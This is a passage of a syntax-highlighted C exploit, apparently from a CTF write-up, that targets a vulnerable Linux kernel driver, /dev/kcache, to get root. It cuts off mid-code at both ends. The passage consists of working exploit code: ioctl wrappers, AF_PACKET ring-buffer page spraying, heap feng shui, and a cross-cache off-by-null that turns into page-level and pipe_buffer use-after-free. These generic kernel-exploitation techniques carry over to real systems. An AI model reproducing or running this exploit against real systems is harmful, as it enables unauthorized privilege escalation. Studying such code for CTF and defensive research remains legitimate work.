class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">     * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">     * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">     * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">     * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">     * cache.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * II - interface to interact with /dev/kcache</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_SIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_NUM 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_ALLOC 0x114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_APPEND 0x514</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_READ 0x1919</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_FREE 0x810</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sz;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_alloc</span><span class="params">(<span class="type">int</span> index, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">        .sz = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_ALLOC, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_append</span><span class="params">(<span class="type">int</span> index, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">        .sz = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_APPEND, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_read</span><span class="params">(<span class="type">int</span> index, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">        .sz = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_READ, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_free</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_FREE, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * III -  pgv pages sprayer related </span></span><br><span class="line"><span class="comment"> * not that we should create two process:</span></span><br><span class="line"><span class="comment"> * - the parent is the one to send cmd and get root</span></span><br><span class="line"><span class="comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span></span><br><span class="line"><span class="comment"> *      receiving cmd from parent and operates it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc pages, return the socket fd */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_socket_and_alloc_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd, version;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, </span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_system</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IV - config for page-level heap spray and heap fengshui</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_4PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_8PAGES_SPRAY_NUM 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pgv_1page_start_idx = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> pgv_4pages_start_idx = PGV_4PAGES_START_IDX;</span><br><span class="line"><span class="type">int</span> pgv_8pages_start_idx = PGV_8PAGES_START_IDX;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* spray pages in different size for various usages */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_pages</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to </span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* for pipe escalation */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SND_PIPE_BUF_SZ 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRD_PIPE_BUF_SZ 192</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pipe_fd[PIPE_SPRAY_NUM][<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> orig_pid = <span class="number">-1</span>, victim_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> snd_orig_pid = <span class="number">-1</span>, snd_vicitm_pid = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> self_2nd_pipe_pid = <span class="number">-1</span>, self_3rd_pipe_pid = <span class="number">-1</span>, self_4th_pipe_pid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">info_pipe_buf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">extend_pipe_buffer_to_4k</span><span class="params">(<span class="type">int</span> start_idx, <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nr; i++) &#123;</span><br><span class="line">        <span class="comment">/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">8</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_8pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[start_idx + i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to extend %d pipe!\n&quot;</span>, start_idx + i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">corrupting_first_level_pipe_for_page_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i ++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to alloc %d pipe!&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to create pipe!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pipe_buffer on order-2 pages, make vul-obj slub around with that.*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(<span class="number">0</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray vulnerable 2k obj...&quot;</span>);</span><br><span class="line">    free_page(pgv_8pages_start_idx++);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_alloc(i, <span class="number">8</span>, <span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] exetend pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extend_pipe_buffer_to_4k(PIPE_SPRAY_NUM / <span class="number">2</span>, PIPE_SPRAY_NUM / <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to extend pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocating pipe pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);  <span class="comment">/* prevent pipe_release() */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to trigger cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring cross-cache off-by-null...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; KCACHE_NUM; i++) &#123;</span><br><span class="line">        kcache_append(i, KCACHE_SIZE - <span class="number">8</span>, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* checking for cross-cache overflow */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for corruption...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="type">char</span> a3_str[<span class="number">0x10</span>];</span><br><span class="line">        <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(a3_str, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(a3_str));</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], a3_str, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(a3_str, <span class="string">&quot;arttnba3&quot;</span>) &amp;&amp; nr != i) &#123;</span><br><span class="line">            orig_pid = nr;</span><br><span class="line">            victim_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found victim: \033[0m%d &quot;</span></span><br><span class="line">                   <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n\n&quot;</span>, </span><br><span class="line">                   victim_pid, orig_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to corrupt pipe_buffer!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">corrupting_second_level_pipe_for_pipe_uaf</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> snd_pipe_sz = <span class="number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[victim_pid][<span class="number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="number">2</span> - <span class="number">24</span> - <span class="number">3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span 